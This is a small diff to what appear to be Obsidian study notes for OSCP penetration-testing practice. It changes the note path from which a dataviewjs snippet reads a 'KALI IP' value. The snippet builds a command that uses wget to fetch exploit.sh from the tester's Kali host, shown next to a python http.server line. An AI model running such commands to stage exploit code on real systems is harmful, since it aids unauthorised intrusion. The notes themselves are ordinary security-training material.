@@ -14,7 +14,7 @@ python3 -m http.server 8000
 ```
 
 ```dataviewjs
-const page = dv.page("Templater/IP");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
+const page = dv.page("Synced OSCP Notes/Top/Active Notes");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
 
 const command = `wget http://${KaliIP}/exploit.sh`;
 
